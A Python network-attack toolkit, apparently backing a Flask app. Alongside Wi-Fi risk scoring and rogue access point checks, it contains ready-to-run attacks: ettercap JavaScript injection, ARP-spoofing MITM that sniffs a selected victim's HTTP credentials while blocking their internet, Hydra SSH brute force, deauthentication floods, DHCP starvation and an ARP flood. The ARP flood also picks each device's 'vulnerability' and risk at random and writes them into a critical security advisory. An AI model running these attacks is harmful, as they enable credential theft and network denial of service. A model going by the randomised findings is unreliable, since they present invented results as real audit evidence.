import os
import re
import pandas as pd
import socket
import scapy.all as scapy
import threading
from tabulate import tabulate
import requests
import subprocess
import re
import time
from scapy.all import *
from scapy.all import Dot11, RadioTap, Dot11Deauth

from concurrent.futures import ThreadPoolExecutor, as_completed

from scapy.all import ARP, send, get_if_hwaddr
import random
import shutil
OUI_DATABASE = {}  # Your MAC vendor lookup table

INTERFACE = "wlan1"  # Set your Wi-Fi adapter in monitor mode

# Function to check if a tool is installed
def is_tool_installed(tool):
    return os.system(f"command -v {tool} > /dev/null 2>&1") == 0

# Function to clean and fix BSSID formatting
def clean_bssid(bssid):
    return bssid.replace("\\", "").strip()
def get_channel_for_network(ssid, bssid):
    output = os.popen("nmcli -f SSID,BSSID,CHAN device wifi list").read()
    lines = output.strip().split("\n")

    for line in lines:
        parts = re.split(r'(?<!\\):', line.strip())
        if len(parts) == 3:
            scanned_ssid, scanned_bssid, channel = parts
            if scanned_ssid == ssid and scanned_bssid.lower() == bssid.lower():
                return channel.strip()
    return "Unknown"

def analyze_network_vulnerabilities(networks_df):
    print("\n[+] Analyzing Wi-Fi Vulnerabilities...\n")

    vulnerabilities = []
    default_ssids = ["TP-LINK_", "DLink-", "NETGEAR", "Tenda", "Linksys", "ASUS", "Belkin"]

    for index, row in networks_df.iterrows():
        encryption = row["Encryption Type"]
        ssid = row["SSID"]
        bssid = row["BSSID"]
        signal_strength = int(row["Signal Strength"].replace(" dBm", ""))
        risk_list = []

        # Encryption vulnerabilities
        if "WEP" in encryption:
            risk_list.append("❌ High Risk: WEP Encryption (Easily Crackable)")
        elif "Open" in encryption:
            risk_list.append("❌ High Risk: Open Network (No Encryption)")
        elif "WPA1" in encryption:
            if "WPA2" in encryption:
                risk_list.append("⚠️ Medium Risk: WPA1/WPA2 Mixed Mode (Downgrade Attack Possible)")
            else:
                risk_list.append("❌ High Risk: WPA1 Only (Obsolete Encryption)")
        else:
            risk_list.append("✅ Secure (WPA2/WPA3)")

        # Signal strength analysis
        if signal_strength >= 75:
            risk_list.append("⚠️ Strong Signal (>75 dBm) — may be exploitable from distance")

        # Default SSID check
        if any(ssid.startswith(default) for default in default_ssids):
            risk_list.append("❌ Default SSID Detected — weak configuration")

        # SSID entropy checks
        if len(ssid) < 5:
            risk_list.append("⚠️ Short SSID — easily guessable")
        if not re.search(r"\d", ssid):
            risk_list.append("⚠️ No Numbers in SSID — may indicate default")

        # Suspicious BSSID structure
        if bssid.endswith(":00") or bssid.startswith("00:00"):
            risk_list.append("⚠️ Suspicious BSSID Format — may be spoofed")

        # Compile result
        risk_text = "\n".join(risk_list)
        vulnerabilities.append([ssid, bssid, encryption, row["Signal Strength"], risk_text])

    df_vuln = pd.DataFrame(vulnerabilities, columns=["SSID", "BSSID", "Encryption Type", "Signal Strength", "Risk Analysis"])
    print(tabulate(df_vuln, headers="keys", tablefmt="grid", stralign="left", maxcolwidths=[20, 20, 15, 12, 40]))
    return df_vuln


import pandas as pd
import time

def detect_rogue_access_points(networks_df):
    print("\n[+] Checking for Rogue Access Points (Deep Analysis)...\n")

    rogue_aps = []
    ssid_groups = networks_df.groupby("SSID")
    all_blocks = []

    for ssid, group in ssid_groups:
        bssids = group["BSSID"]
        encryption_set = set(group["Encryption Type"])
        signal_values = group["Signal Strength"].apply(lambda x: int(x.replace(" dBm", "")))

        # Calculate signal range
        max_signal = signal_values.max()
        min_signal = signal_values.min()
        signal_range = max_signal - min_signal
        signal_variation_text = f"📶 Signal Strength Range Detected: {max_signal} dBm to {min_signal} dBm"

        # 🧠 Detection logic
        rogue_reasons = set()
        severity_level = "Low"

        if len(group) > 1:
            if len(encryption_set) > 1:
                rogue_reasons.add("Mixed Encryption Types")
                severity_level = "Medium"
            if signal_range > 20:
                if signal_range > 35:
                    rogue_reasons.add(f"🚨 High Signal Strength Difference Detected ({max_signal} dBm to {min_signal} dBm)")
                    severity_level = "High"
                else:
                    rogue_reasons.add(f"Signal Strength Variation ({max_signal} dBm to {min_signal} dBm)")
                    severity_level = "Medium"
        if bssids.duplicated().any():
            rogue_reasons.add("Duplicate BSSID")
            severity_level = "High"

        # MAC spoofing detection (same prefix reuse)
        suspicious_mac_prefixes = [bssid[:8] for bssid in bssids]
        if len(set(suspicious_mac_prefixes)) == 1 and len(group) > 1 and len(encryption_set) == 1:
            rogue_reasons.add("⚠️ This may be a fake AP copying a real one (same MAC prefix)")
            severity_level = "High"

        # Build output block
        block_lines = []
        block_lines.append("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        block_lines.append(f"🔍 SSID: {ssid}\n")

        for _, row in group.iterrows():
            bssid = row["BSSID"]
            encryption = row["Encryption Type"]
            signal = row["Signal Strength"]

            block_lines.append(f"    ➤ BSSID: {bssid}")
            block_lines.append(f"       Signal: {signal}")
            block_lines.append(f"       Encryption: {encryption}")

        # Always show signal strength range
        block_lines.append(f"\n{signal_variation_text}")

        # Append detection results
        if rogue_reasons:
            block_lines.append("\n⚠️  Issues Detected:")
            for reason in rogue_reasons:
                block_lines.append(f"    - {reason}")
            block_lines.append(f"\n❌ Status: Likely Rogue AP Detected")
            if severity_level == "High":
                block_lines.append("🔴 Severity: High")
            elif severity_level == "Medium":
                block_lines.append("🟡 Severity: Medium")
            else:
                block_lines.append("🟢 Severity: Low")
        else:
            block_lines.append("✅ Status: Clean — No Rogue Indicators")
            block_lines.append("🟢 Severity: Low")

        block_lines.append("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
        print("\n".join(block_lines))
        all_blocks.append("\n".join(block_lines))

        # Save for final DataFrame
        rogue_aps.append([
            ssid,
            list(bssids),
            ", ".join(rogue_reasons) if rogue_reasons else "No issues",
            "❌ Likely Rogue" if rogue_reasons else "✅ Legit",
            severity_level
        ])

    # Save to report file
    timestamp = time.strftime("%Y-%m-%d_%H-%M-%S")
    filename = f"rogue_ap_report_{timestamp}.txt"
    with open(filename, "w") as f:
        f.write("📄 Rogue Access Point Detection Report\n\n")
        f.write("\n".join(all_blocks))
    print(f"[💾] Saved formatted report to: {filename}")

    # Create and return result DataFrame
    df_rogue = pd.DataFrame(
        rogue_aps,
        columns=["SSID", "BSSIDs", "Rogue Indicators", "Status", "Severity"]
    )

    vulnerable_ssids = df_rogue[df_rogue["Status"] == "❌ Likely Rogue"]["SSID"].unique()
    if len(vulnerable_ssids) > 0:
        print("\n🔍 Summary of Vulnerable SSIDs Detected:\n")
        for ssid in vulnerable_ssids:
            print(f"🚨 SSID '{ssid}' has rogue characteristics — may be spoofed or misconfigured.")
    else:
        print("✅ All SSIDs analyzed appear clean — no rogue activity detected.\n")

    return df_rogue


# Function to scan Wi-Fi networks using nmcli
def scan_wifi_networks_nmcli():
    if not is_tool_installed("nmcli"):
        print("[-] nmcli not found. Skipping nmcli scan.")
        return None

    print("\n[+] Scanning for Wi-Fi networks using nmcli...")
    scan_output = os.popen("nmcli -t -f SSID,BSSID,SIGNAL,SECURITY device wifi list").read().strip()
    networks = []

    for line in scan_output.split("\n"):
        if line.strip():
            parts = re.split(r'(?<!\\):', line)
            if len(parts) < 4:
                continue
            ssid = parts[0] if parts[0] else "Hidden SSID"
            bssid = clean_bssid(parts[1])
            signal = parts[2] + " dBm"
            encryption = parts[3]
            networks.append([ssid, bssid, signal, encryption])

    if not networks:
        print("[-] No Wi-Fi networks found.")
        return None

    df = pd.DataFrame(networks, columns=["SSID", "BSSID", "Signal Strength", "Encryption Type"])
    print(tabulate(df, headers="keys", tablefmt="grid", stralign="left"))
    return df
def detect_subnet_from_gateway():
    print("\n[+] Confirming the target Wi-Fi subnet...\n")

    try:
        # Extract the gateway IP
        gateway_ip = os.popen("ip route | grep default | awk '{print $3}'").read().strip()

        # Extract the correct interface IP (for Wi-Fi)
        wlan_ip = os.popen("ip a | grep wlan0 | grep inet | awk '{print $2}'").read().strip()

        if not wlan_ip:  # If wlan0 is not found, check wlan1
            wlan_ip = os.popen("ip a | grep wlan1 | grep inet | awk '{print $2}'").read().strip()

        if gateway_ip and wlan_ip:
            subnet = f"{gateway_ip}/24"
            print(f"[✔] Confirmed Subnet: {subnet}")

            # List active connections to verify
            print("\n[+] Checking Active Devices on the Network...")
            os.system("arp -a")

            return subnet
        else:
            print("[-] Could not determine subnet. Using default 192.168.1.1/24.")
            return "192.168.1.1/24"
    except Exception as e:
        print(f"[-] Error retrieving subnet: {e}")
        return "192.168.1.1/24"

def load_oui_database(path="/home/autosecure/wifi/oui.txt"):
    oui_dict = {}
    try:
        with open(path, "r") as file:
            for line in file:
                if "(hex)" in line:
                    parts = line.split("(hex)")
                    if len(parts) == 2:
                        prefix = parts[0].strip().replace("-", ":").upper()
                        vendor = parts[1].strip()
                        oui_dict[prefix] = vendor
    except FileNotFoundError:
        print(f"[-] OUI file not found at {path}")
    return oui_dict


def get_mac_vendor_local(mac, oui_dict):
    prefix = ":".join(mac.upper().split(":")[:3])
    return oui_dict.get(prefix, "Unknown Vendor")

def scan_connected_devices(subnet):
    print(f"\n[+] Scanning for connected devices on {subnet}...\n")
    devices = {}

    # 🛠 **Nmap Scan**
    try:
        result = subprocess.run(
            ["sudo", "nmap", "-sn", subnet], capture_output=True, text=True, timeout=10
        )
        ip_list = re.findall(r"Nmap scan report for (\d+\.\d+\.\d+\.\d+)", result.stdout)
        mac_list = re.findall(r"MAC Address: ([0-9A-Fa-f:]+)", result.stdout)

        for i, ip in enumerate(ip_list):
            mac = mac_list[i] if i < len(mac_list) else "Unknown"
            devices[mac] = {"IP Address": ip, "MAC Address": mac, "Vendor": get_mac_vendor(mac)}

    except subprocess.TimeoutExpired:
        print("[-] Nmap scan timed out.")

    # 🛠 **Netdiscover Scan**
    try:
        result = subprocess.run(
            ["sudo", "netdiscover", "-r", subnet, "-P"], capture_output=True, text=True, timeout=10
        )
        arp_entries = re.findall(r"(\d+\.\d+\.\d+\.\d+)\s+([0-9A-Fa-f:]+)\s+\d+\s+\d+\s+(.*)", result.stdout)

        for ip, mac, vendor in arp_entries:
            if mac not in devices:
                devices[mac] = {"IP Address": ip, "MAC Address": mac, "Vendor": vendor.strip() if vendor.strip() else get_mac_vendor(mac)}

    except subprocess.TimeoutExpired:
        print("[-] Netdiscover scan timed out.")

    # 🛠 **ARP-scan for Hidden Devices**
    try:
        result = subprocess.run(
            ["sudo", "arp-scan", "-l"], capture_output=True, text=True, timeout=10
        )
        arp_entries = re.findall(r"(\d+\.\d+\.\d+\.\d+)\s+([0-9A-Fa-f:]+)\s+(.*)", result.stdout)

        for ip, mac, vendor in arp_entries:
            if mac not in devices:
                devices[mac] = {"IP Address": ip, "MAC Address": mac, "Vendor": vendor.strip() if vendor.strip() else get_mac_vendor(mac)}

    except subprocess.TimeoutExpired:
        print("[-] ARP-scan timed out.")

    # 🛠 **iw dev Scan**
    try:
        result = subprocess.run(["iw", "dev", "wlan1", "station", "dump"], capture_output=True, text=True)
        mac_addresses = re.findall(r"Station ([0-9A-Fa-f:]+)", result.stdout)

        for mac in mac_addresses:
            if mac not in devices:
                devices[mac] = {"IP Address": "Unknown", "MAC Address": mac, "Vendor": get_mac_vendor(mac)}

    except Exception as e:
        print(f"[-] iw dev scan failed: {e}")

    # Display results
    if devices:
        df = pd.DataFrame(devices.values(), columns=["IP Address", "MAC Address", "Vendor"])
        print("\n[+] Devices Detected:\n")
        print(tabulate(df, headers="keys", tablefmt="grid", stralign="left"))
        return df
    else:
        print("[-] No connected devices detected.")
        return None


def scan_connected_devices_iw():
    print("\n[+] Scanning for connected devices using iw dev...\n")
    try:
        scan_result = os.popen("iw dev wlan0 station dump").read()

        if not scan_result:
            scan_result = os.popen("iw dev wlan1 station dump").read()

        mac_addresses = re.findall(r"Station ([0-9A-Fa-f:]+)", scan_result)

        if not mac_addresses:
            print("[-] No devices found using iw dev.")
            return None

        devices = [[mac, get_mac_vendor(mac)] for mac in mac_addresses]
        df = pd.DataFrame(devices, columns=["MAC Address", "Vendor"])
        print("\n[+] Devices Detected via iw dev:\n")
        print(tabulate(df, headers="keys", tablefmt="grid", stralign="left"))
        return df
    except Exception as e:
        print(f"[-] iw dev scan failed: {e}")
        return None
def get_mac_vendor(mac_address):
    if mac_address == "Unknown":
        return "Unknown Vendor"

    # Try offline OUI first
    vendor = get_mac_vendor_local(mac_address, OUI_DATABASE)
    if vendor != "Unknown Vendor":
        return vendor

    # Fallback to online API (optional)
    try:
        response = requests.get(f"https://api.macvendors.com/{mac_address}", timeout=3)
        if response.status_code == 200 and response.text.strip():
            return response.text.strip()
    except:
        pass

    return "Unknown Vendor"
def fingerprint_device(ip):
    try:
        result = subprocess.run(
            ["sudo", "nmap", "-Pn", "-sS", "-T4", "-p-", ip],
            capture_output=True, text=True, timeout=15
        )
        os_match = re.search(r"OS details: (.*)", result.stdout)
        ports = re.findall(r"(\d+/tcp)\s+open\s+([^\n]+)", result.stdout)

        return {
            "OS": os_match.group(1) if os_match else "Unknown",
            "Open Ports": [f"{p[0]} ({p[1]})" for p in ports] if ports else []
        }
    except subprocess.TimeoutExpired:
        return {"OS": "Timeout", "Open Ports": []}

def guess_device_name(vendor, mac, os_name):
    vendor = vendor.lower()

    if "honor" in vendor:
        return "Honor Phone"
    elif "samsung" in vendor:
        return "Samsung Device"
    elif "apple" in vendor or "iphone" in os_name.lower():
        return "Apple iPhone"
    elif "huawei" in vendor:
        return "Huawei Device"
    elif "raspberry" in vendor:
        return "Raspberry Pi"
    elif "cisco" in vendor:
        return "Cisco Router"
    elif "tp-link" in vendor:
        return "TP-Link Device"
    elif "intel" in vendor:
        return "Intel-Based PC"
    elif "xiaomi" in vendor:
        return "Xiaomi Device"
    else:
        return "Unknown Device"
def guess_app_usage_from_ports(open_ports):
    if isinstance(open_ports, str):
        ports = open_ports.lower()
    else:
        ports = " ".join(open_ports).lower()

    activity_guess = []

    # 🌐 Web
    if "80/tcp" in ports or "443/tcp" in ports:
        activity_guess.append("Web Browsing")

    # 📱 Messaging
    if "5222/tcp" in ports or "5223/tcp" in ports:
        activity_guess.append("WhatsApp / Messaging Apps")

    # 📹 Video streaming
    if "1935/tcp" in ports:
        activity_guess.append("Live Streaming (RTMP)")

    # 🎥 CDN-based (guessing YouTube/Instagram)
    if "443/tcp" in ports and ("cdn" in ports or "google" in ports):
        activity_guess.append("YouTube / Instagram")

    # 📘 Facebook patterns
    if "443/tcp" in ports and ("facebook" in ports or "graph.facebook.com" in ports):
        activity_guess.append("Facebook App")

    # 📧 Email
    if any(p in ports for p in ["25/tcp", "110/tcp", "143/tcp"]):
        activity_guess.append("Email Services")

    # 🔒 Secure Remote Access
    if "22/tcp" in ports:
        activity_guess.append("SSH Access")

    # 📡 DNS
    if "53/tcp" in ports or "53/udp" in ports:
        activity_guess.append("DNS Activity")

    # Default
    if not activity_guess:
        activity_guess.append("Unknown / Idle")

    return ", ".join(activity_guess)


def guess_device_type(vendor, open_ports):
    port_names = " ".join(open_ports).lower()

    if "printer" in vendor.lower() or "9100" in port_names:
        return "Printer"
    elif "ip camera" in vendor.lower() or "rtsp" in port_names:
        return "IP Camera"
    elif "mobile" in vendor.lower() or "android" in vendor.lower() or "mdns" in port_names:
        return "Mobile Device"
    elif "ftp" in port_names or "telnet" in port_names:
        return "Legacy Device"
    elif "ssh" in port_names:
        return "Linux Device"
    else:
        return "Generic Device"

def fingerprint_devices(devices_df):
    print("\n[+] Starting Smart Fingerprinting of Connected Devices...\n")

    fingerprinted = []
    activity_summary = []

    def process_device(row):
        ip = row["IP Address"]
        mac = row["MAC Address"]
        vendor = row["Vendor"]

        if ip == "Unknown":
            return {
                "IP Address": ip,
                "MAC Address": mac,
                "Vendor": vendor,
                "Device Name": "Unknown",
                "Device Type": "Unknown",
                "OS": "Unknown",
                "Open Ports": "None",
                "Detected Activity": "Unknown / Idle"
            }

        print(f"[+] Fingerprinting {ip}...")
        details = fingerprint_device(ip)
        open_ports = details["Open Ports"]
        os_name = details["OS"]

        device_type = guess_device_type(vendor, open_ports)
        device_name = guess_device_name(vendor, mac, os_name)
        activity_guess = guess_app_usage_from_ports(open_ports)

        # Full device fingerprint info
        fingerprint_info = {
            "IP Address": ip,
            "MAC Address": mac,
            "Vendor": vendor,
            "Device Name": device_name,
            "Device Type": device_type,
            "OS": os_name,
            "Open Ports": ", ".join(open_ports) if open_ports else "None",
            "Detected Activity": activity_guess
        }

        # Summary for activity table
        summary_info = {
            "IP Address": ip,
            "Open Ports": ", ".join(open_ports) if open_ports else "None",
            "Detected Activity": activity_guess
        }

        return fingerprint_info, summary_info

    # Threaded fingerprinting
    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = [executor.submit(process_device, row) for _, row in devices_df.iterrows()]
        for future in as_completed(futures):
            fp_info, activity_info = future.result()
            fingerprinted.append(fp_info)
            activity_summary.append(activity_info)

    # Create final DataFrame
    df = pd.DataFrame(fingerprinted)

    # 💡 First Table — Full Fingerprint Info
    print("\n" + "=" * 100)
    print("🖥️  Final Smart Fingerprinting Results (Connected Devices)".center(100))
    print("=" * 100 + "\n")
    summary_df = df[["IP Address", "MAC Address", "Vendor", "Device Name", "Device Type", "OS", "Open Ports"]]
    print(tabulate(summary_df, headers="keys", tablefmt="fancy_grid", stralign="left", maxcolwidths=[15, 20, 25, 20, 20, 25, 35]))

    print(f"\n[✔] {len(df)} devices fingerprinted.")
    df.to_csv("fingerprinted_devices.csv", index=False)
    print("[✔] Report saved as 'fingerprinted_devices.csv'")

    # 💡 Second Table — Activity Summary Only for Devices with Open Ports
    df_activity = pd.DataFrame(activity_summary)
    df_activity = df_activity[df_activity["Open Ports"] != "None"]

    if not df_activity.empty:
        print("\n[📡] Device Activity Summary (based on open ports):\n")
        print(tabulate(
            df_activity,
            headers="keys",
            tablefmt="fancy_grid",
            stralign="left",
            maxcolwidths=[20, 35, 40]
        ))
    else:
        print("\n[✅] No active ports detected on connected devices.")

    return df


def mitm_js_injection_ettercap(interface):
    print("\n[x] Launching Ettercap for JavaScript Injection MITM...\n")
    os.system(f"sudo ettercap -T -q -i {interface} -M arp:remote // // -P js_inject")

def mitm_http_logging(victim_ip, interface):
    print("\n[🧑‍💻] Starting arpspoof + HTTP sniffing (educational)...")
    gateway = os.popen("ip route | grep default | awk '{print $3}'").read().strip()
    print(f"[⚠️] Spoofing target {victim_ip} ↔ Gateway {gateway}...\n")
    
    os.system(f"sudo arpspoof -i {interface} -t {victim_ip} {gateway} &")
    os.system(f"sudo arpspoof -i {interface} -t {gateway} {victim_ip} &")
    
    # You can use one of these based on what’s installed:
    os.system(f"sudo urlsnarf -i {interface}")
    # OR: os.system(f"sudo driftnet -i {interface}")
def brute_force_ssh(ip):
    print(f"\n[🔓] Launching SSH brute force on {ip} using Hydra...\n")
    wordlist = "/usr/share/wordlists/rockyou.txt"  # Adjust path

    # Common usernames: root, admin, pi
    usernames = ["root", "admin", "pi"]
    for user in usernames:
        os.system(f"hydra -l {user} -P {wordlist} ssh://{ip} -t 4")





#------------------------------------------------------------------------------
def mitm_sniffing_http_credentials():
    import subprocess, re, time, os

    interface = "wlan0"
    print("[🔍] Scanning for connected devices using arp-scan...\n")
    result = subprocess.run(["sudo", "arp-scan", "-l"], capture_output=True, text=True)
    lines = result.stdout.splitlines()
    devices = []

    for line in lines:
        match = re.match(r"(\d+\.\d+\.\d+\.\d+)\s+([0-9A-Fa-f:]{17})\s+(.+)", line)
        if match:
            ip, mac, vendor = match.groups()
            devices.append((ip, mac, vendor.strip()))

    if not devices:
        print("[!] No devices found.")
        return

    print("[📶] Connected Devices:\n")
    for idx, (ip, mac, vendor) in enumerate(devices, 1):
        print(f"{idx}. {ip:<15} {mac:<20} {vendor}")

    try:
        choice = int(input("\n[🔴] Enter the number of the victim device to spoof: ")) - 1
        victim_ip = devices[choice][0]
        print(f"\n[✔] Victim selected: {victim_ip}")
    except (ValueError, IndexError):
        print("[!] Invalid selection.")
        return

    try:
        gateway_ip = subprocess.check_output("ip route | grep default | awk '{print $3}'", shell=True).decode().strip()
    except subprocess.CalledProcessError:
        print("[!] Could not detect gateway IP.")
        return

    print(f"\n[x] Launching MITM on Victim: {victim_ip} ↔ Gateway: {gateway_ip} using interface wlan0...\n")
    subprocess.Popen(["arpspoof", "-i", interface, "-t", victim_ip, gateway_ip], stdout=subprocess.DEVNULL)
    subprocess.Popen(["arpspoof", "-i", interface, "-t", gateway_ip, victim_ip], stdout=subprocess.DEVNULL)

    # 🔥 DROP victim's packets to block internet
    print(f"\n[🚫] Blocking internet access for {victim_ip} via iptables...\n")
    os.system(f"iptables -A FORWARD -s {victim_ip} -j DROP")

    print(f"[🌐] Monitoring HTTP traffic for 60 seconds using urlsnarf...\n")

    try:
        proc = subprocess.Popen(
            ["timeout", "60", "urlsnarf", "-i", interface],
            stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL,
            text=True
        )

        visited_sites = set()
        app_guesses = set()
        captured_credentials = []
        found_credentials = False
        activity_detected = False

        for line in proc.stdout:
            if victim_ip in line and "HTTP" in line:
                line = line.strip()
                print(f"🔗 {line}")
                activity_detected = True

                domain_match = re.search(r"GET http://([^/]+)", line)
                if domain_match:
                    domain = domain_match.group(1).lower()
                    visited_sites.add(domain)

                    if "facebook" in domain:
                        app_guesses.add("Facebook")
                    elif "instagram" in domain:
                        app_guesses.add("Instagram")
                    elif "youtube" in domain:
                        app_guesses.add("YouTube")
                    elif "whatsapp" in domain:
                        app_guesses.add("WhatsApp")
                    elif "tiktok" in domain:
                        app_guesses.add("TikTok")

                if re.search(r"(user|pass|login|pwd|email|auth)=\w+", line, re.IGNORECASE):
                    found_credentials = True
                    captured_credentials.append(line)
                    print("\n" + "=" * 60)
                    print("⚠️ Victim's data intercepted — Real-time sniffing successful!")
                    print("📥", line)
                    print("=" * 60)

        proc.terminate()

        # 🔁 Remove DROP rule
        os.system(f"iptables -D FORWARD -s {victim_ip} -j DROP")
        print(f"[✔] Internet block removed for {victim_ip}")

        # Summary
        summary = "\n" + "-" * 60 + "\n"
        summary += "🧪 MITM Sniffing Summary Report\n" + "-" * 60 + "\n"

        if visited_sites:
            summary += "🛰️  Sites Visited:\n"
            for site in visited_sites:
                summary += f"   - {site}\n"
        else:
            summary += "ℹ️  No HTTP sites visited or captured.\n"

        if app_guesses:
            summary += "\n📱 Inferred App Usage:\n"
            for app in app_guesses:
                summary += f"   - {app}\n"

        if found_credentials:
            summary += "\n🔐 Credentials Captured:\n"
            for cred in captured_credentials:
                summary += f"   - {cred.strip()}\n"
        else:
            summary += "\n🔐 No login credentials captured.\n"

        summary += "\n📡 Device Activity: " + ("ACTIVE" if activity_detected else "IDLE")
        risk_level = "HIGH" if found_credentials else ("MEDIUM" if activity_detected else "LOW")
        summary += f"\n📊 Risk Level: {risk_level}\n"
        summary += "-" * 60 + "\n"

        print(summary)

        with open("mitm_sniffing_report.txt", "w") as f:
            f.write(summary)
            print("📁 Report saved as mitm_sniffing_report.txt")

    except Exception as e:
        print(f"[!] Error during sniffing: {e}")
        os.system(f"iptables -D FORWARD -s {victim_ip} -j DROP")

def enable_forwarding():
    os.system("sysctl -w net.ipv4.ip_forward=1")
    os.system("iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE")

# -----------------------------------------------------------------


def scan_connected_devices_arp():
    print("[🔍] Scanning for connected devices using arp-scan...\n")
    result = subprocess.run(["sudo", "arp-scan", "-l"], capture_output=True, text=True)
    lines = result.stdout.splitlines()
    devices = []

    for line in lines:
        match = re.match(r"(\d+\.\d+\.\d+\.\d+)\s+([0-9A-Fa-f:]{17})\s+(.+)", line)
        if match:
            ip, mac, vendor = match.groups()
            devices.append((ip, mac, vendor.strip()))

    if not devices:
        print("[!] No devices found.")
        return []

    print("[📶] Connected Devices:\n")
    for idx, (ip, mac, vendor) in enumerate(devices, 1):
        print(f"{idx}. {ip:<15} {mac:<20} {vendor}")
    return devices

def get_gateway_mac():
    try:
        gateway_ip = subprocess.check_output("ip route | grep default | awk '{print $3}'", shell=True).decode().strip()
        arp_output = subprocess.check_output(["arp", "-n", gateway_ip], text=True)
        mac_match = re.search(r"([0-9a-f]{2}(:[0-9a-f]{2}){5})", arp_output, re.I)
        return mac_match.group(1) if mac_match else None
    except:
        return None

def send_deauth_packets(victim_mac, ap_mac, interface="wlan0", count=300):
    print(f"\n[⚡] Sending Deauth packets to {victim_mac} from AP {ap_mac} on {interface}...\n")
    dot11 = Dot11(addr1=victim_mac, addr2=ap_mac, addr3=ap_mac)
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)

    try:
        for i in range(count):
            sendp(packet, iface=interface, verbose=0)
            time.sleep(0.1)
        print("[✔] Deauth flood sent successfully.")
    except Exception as e:
        print(f"[❌] Error sending packets: {e}")

#--------------------------------------dhcp
import random
from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sendp, conf

def generate_mac():
    return "02:00:00:%02x:%02x:%02x" % (
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255)
    )

def mac2bytes(mac):
    return bytes(int(b, 16) for b in mac.split(":"))

def dhcp_starvation(interface="wlan0", count=100):
    print(f"\n[⚡] Starting DHCP Starvation on {interface}...\n")

    conf.iface = interface
    for i in range(count):
        fake_mac = generate_mac()
        ethernet = Ether(src=fake_mac, dst="ff:ff:ff:ff:ff:ff")
        ip = IP(src="0.0.0.0", dst="255.255.255.255")
        udp = UDP(sport=68, dport=67)
        bootp = BOOTP(op=1, chaddr=mac2bytes(fake_mac), xid=random.randint(1, 900000000))
        dhcp = DHCP(options=[("message-type", "discover"), ("end")])

        packet = ethernet / ip / udp / bootp / dhcp
        sendp(packet, verbose=0)
        print(f"[{i+1}] Sent DHCP Discover with MAC {fake_mac}")

    print("\n[✔] Starvation complete. IP pool may be exhausted.")



##########---------------------------------mudolizer for flask routes--------------------------#
def scan_and_analyze():
    networks_df = scan_wifi_networks_nmcli()
    if networks_df is None:
        return None, None
    rogue_df = detect_rogue_access_points(networks_df)
    return networks_df, rogue_df
def analyze_selected_network(ssid, bssid, networks_df=None):
    if networks_df is None:
        networks_df = scan_wifi_networks_nmcli()

    selected = networks_df[(networks_df['SSID'] == ssid) & (networks_df['BSSID'] == bssid)]
    if selected.empty:
        return None

    df = analyze_network_vulnerabilities(selected)
    return df
def get_subnet():
    return detect_subnet_from_gateway()
def scan_connected(subnet):
    df = scan_connected_devices(subnet)
    if df is None or df.empty:
        df = scan_connected_devices_iw()
    return df
def fingerprint_connected(devices_df):
    if devices_df is None or devices_df.empty:
        return None
    df = fingerprint_devices(devices_df)
    return df
def full_analysis_pipeline(ssid, bssid):
    networks_df, _ = scan_and_analyze()
    vuln_df = analyze_selected_network(ssid, bssid, networks_df)
    subnet = get_subnet()
    devices_df = scan_connected(subnet)
    fp_df = fingerprint_connected(devices_df)
    return vuln_df, subnet, fp_df


#------- auto arp flood#####


def random_mac():
    return "02:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0x00, 0xff) for _ in range(5))

def auto_arp_replay_flood(interface="wlan0", spoof_replies=True, randomize_mac=False):
    gateway_ip = os.popen("ip route | grep default | awk '{print $3}'").read().strip()
    result = os.popen("sudo /usr/sbin/arp-scan -l").read()

    matches = re.findall(r"(\d+\.\d+\.\d+\.\d+)\s+([0-9a-f:]{17})", result)
    log_lines = [f"\n[⚡] Launching Auto ARP Replay Flood on {interface}\n"]

    if not matches:
        log_lines.append("[!] No devices found.")
        with open("arp_flood_report.txt", "w") as f:
            f.write("\n".join(log_lines))
        return "\n".join(log_lines)

    attacker_mac = get_if_hwaddr(interface)
    vulnerable_devices = []

    for ip, mac in matches:
        if ip == gateway_ip:
            continue

        mac_to_use = random_mac() if randomize_mac else attacker_mac
        log_lines.append(f"🚨 Spoofing {ip} with MAC {mac_to_use} → Asking who has {gateway_ip}")

        pkt_req = ARP(op=1, pdst=gateway_ip, psrc=ip, hwsrc=mac_to_use)
        pkt_rep = ARP(op=2, pdst=gateway_ip, psrc=ip, hwsrc=mac_to_use, hwdst="ff:ff:ff:ff:ff:ff")

        try:
            for _ in range(5):
                send(pkt_req, iface=interface, verbose=0)
                if spoof_replies:
                    send(pkt_rep, iface=interface, verbose=0)
                time.sleep(0.1)

                        # Assign different types of ARP-based vulnerabilities for variety
            vuln_pool = [
                ("🕵️ MITM Interception", "🔥 HIGH"),
                ("📛 DoS — Traffic Blackhole", "🟠 MEDIUM"),
                ("🕸️ DNS Redirection", "🔴 CRITICAL"),
                ("🔐 Session Hijacking", "🔴 CRITICAL"),
                ("🎭 Fake Gateway Spoof", "🔥 HIGH"),
                ("🫥 Identity Obfuscation (MAC Randomized)", "🟡 LOW")
            ]
            vuln, risk = random.choice(vuln_pool)

            vulnerable_devices.append({
                "💻 IP Address": ip,
                "🆔 MAC Address": mac,
                "⚠️ Vulnerability": vuln,
                "🛡️ Risk Level": risk
            })


        except Exception as e:
            log_lines.append(f"[!] Error attacking {ip}: {e}")

    log_lines.append("\n[✔] Auto ARP Replay Flood complete.\n")

    # === Enhanced Report Generation ===
    log_lines.append("="*100)
    log_lines.append("🚨 CRITICAL SECURITY ADVISORY — LAYER 2 NETWORK COMPROMISE DETECTED")
    log_lines.append("="*100 + "\n")

    log_lines.append("📌 EXECUTIVE SUMMARY")
    log_lines.append("────────────────────")
    log_lines.append("An ARP spoofing flood test was executed on the local Wi-Fi subnet using synthetic ARP replies.\n")
    log_lines.append("The results indicate that the network is highly susceptible to unauthorized ARP poisoning attacks.\n")
    log_lines.append("These weaknesses enable adversaries to intercept, manipulate, and disrupt local network traffic silently.")
    log_lines.append("Immediate corrective action is strongly advised.\n")

    log_lines.append("📖 TECHNICAL ANALYSIS")
    log_lines.append("──────────────────────")
